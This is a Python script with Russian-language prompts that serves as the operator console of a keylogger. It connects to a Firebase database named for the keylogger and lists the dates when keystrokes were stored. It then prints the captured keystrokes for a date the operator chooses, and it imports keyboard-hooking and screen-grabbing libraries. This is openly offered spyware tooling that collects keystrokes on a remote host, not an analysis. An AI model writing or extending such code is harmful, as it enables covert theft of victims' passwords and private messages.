import keyboard
from threading import Thread
from datetime import datetime
import firebase_admin
from firebase_admin import db
import numpy as np
from PIL import Image, ImageGrab    #  pip install Pillow

from ping3 import ping
all_keys = []
all_n = {"enter": "\n", "tab": "\t"}

cred_obj = firebase_admin.credentials.Certificate('kreds.json')
app_d = firebase_admin.initialize_app(cred_obj, {
    'databaseURL': "https://keyloggerpython-3393e-default-rtdb.firebaseio.com/"
})
while True:
    d = input("Выберите действие - просмотр всех дат сохранения, ввести дату для просмотра (П/В)\n")
    if d == "П":
        ref = db.reference(f"/keys")
        data = ref.get()
        if data:
            for i in data:
                i.replace("@", "/")
                print(f'Дата: {i.replace("@", "/")}')
        else:
            print("Пока нет доступных дат!")
    if d == "В":
        date = input("Введите дату, чтобы видеть с какого дня писались клавиши. В формате месяц@день@час:\n")
        # date = date.split("/")
        # month, day, hour = date
        # date ={"month": int(month), "day": int(day), "hour": int(hour)}
        print(date)
        ref = db.reference(f"/keys/{date}")
        data = ref.get()
        names = data["keys"]
        date = data["date"]
        if names:
            for i in names:
                print(i, end="")
            print()
        else:

            print("Пока доступных к прослушке клавиш нет!")